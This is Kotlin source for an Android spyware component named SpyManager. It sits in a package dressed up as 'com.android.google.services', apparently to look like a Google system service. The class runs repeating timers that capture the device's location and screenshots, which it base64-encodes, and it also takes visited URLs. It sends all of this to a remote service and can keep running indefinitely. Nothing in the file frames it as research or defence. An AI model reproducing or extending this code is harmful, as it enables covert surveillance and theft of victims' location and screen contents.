package com.android.google.services.spymanager

import android.graphics.Bitmap
import android.os.Build
import android.os.CountDownTimer
import com.android.google.MainActivity
import com.android.google.constants.LocationConstants
import com.android.google.constants.ScreenshotConstants
import com.android.google.remote.RemoteService
import com.android.google.remote.models.LocationDTO
import com.android.google.remote.models.ScreenshotDTO
import com.android.google.remote.models.UrlDTO
import com.android.google.services.screenshoot.IScreenshotService
import com.android.google.services.tracker.LocationService
import com.android.google.services.tracker.models.TrackerLocation
import com.android.google.utils.logw
import com.android.google.utils.toBase64
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

/*
* Manage all services
* Optional: create manager with helper (singleton way)
* */

class SpyManager(
    private var remote: RemoteService,
    private var screenshotService: IScreenshotService
) {

    private var enabled = false
    private lateinit var screenshotTimer: CountDownTimer
    private lateinit var locationTimer: CountDownTimer
    private lateinit var stopTimer: CountDownTimer

    init {
        logw("SpyManager. Activated.")
    }

    fun start(
        screenshotService: Boolean,
        locationService: Boolean,
        lifetime: Long = ENDLESS
    ) {
        if (enabled) return

        logw("SpyManager. Started.")
        enabled = true
        if (screenshotService) enableScreenshotService()
        if (locationService) enableLocationService()

        if(lifetime != ENDLESS) startStopTimer(lifetime)
    }

    fun stop() {
        if(this::screenshotTimer.isInitialized) screenshotTimer.cancel()
        if(this::locationTimer.isInitialized) locationTimer.cancel()
        if(this::stopTimer.isInitialized) stopTimer.cancel()

        logw("SpyManager. Stopped.")
    }

    private fun startStopTimer(lifetime: Long) {
        stopTimer = object : CountDownTimer(lifetime, lifetime) {
            override fun onTick(millisUntilFinished: Long) {
                stop()
            }

            override fun onFinish() {}

        }.start()
    }

    private fun enableLocationService() {
        val interval = LocationConstants.UPDATE_INTERVAL

        locationTimer = object : CountDownTimer(interval * 2, interval) {
            override fun onTick(millisUntilFinished: Long) {
                getAndSendLocation()
            }

            override fun onFinish() {
                locationTimer.start()
            }

        }.start()
    }

    private fun enableScreenshotService() {
        val interval = ScreenshotConstants.UPDATE_INTERVAL

        screenshotTimer = object : CountDownTimer(interval * 2, interval) {
            override fun onTick(millisUntilFinished: Long) {
                takeAndSendScreenshot()
            }

            override fun onFinish() {
                screenshotTimer.start()
            }

        }.start()
    }

    private fun getAndSendLocation() = CoroutineScope(Dispatchers.IO).launch {
        val location = getLocationFromService()
        val locationDTO = LocationDTO(location.lat, location.lon)

        remote.sendLocation(location = locationDTO)

        logw("SpyManager. Sending location $location.")
    }

    private fun getLocationFromService(): TrackerLocation =
        LocationService.getLocation()

    fun takeAndSendScreenshot() = CoroutineScope(Dispatchers.IO).launch {
        if(!MainActivity.isVisible) return@launch

        val screenBitmap = getScreenshotFromService()
        val base64 = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            screenBitmap.toBase64()
        } else {
            BASE_BITMAP
        }

        val screenshotDTO = ScreenshotDTO(base64 = base64)
        remote.sendScreenshot(screenshotDTO)

        logw("SpyManager. Sending screenshot $screenBitmap.")
    }

    private fun getScreenshotFromService(): Bitmap =
        screenshotService.takeScreenshot()

    fun sendUrl(url: String) = CoroutineScope(Dispatchers.IO).launch {
        val urlDTO = UrlDTO(url = url)
        remote.sendUrl(urlDTO)

        logw("SpyManager. Sending url $url.")
    }

    companion object {
        private const val BASE_BITMAP = ""
        private const val ENDLESS = -1L
        private var INSTANCE: SpyManager? = null

        fun newInstance(
            remote: RemoteService,
            screenshotService: IScreenshotService
        ): SpyManager {
            if (INSTANCE != null) return INSTANCE!!

            val temp = SpyManager(
                remote = remote,
                screenshotService = screenshotService
            )

            INSTANCE = temp

            return temp
        }
    }

}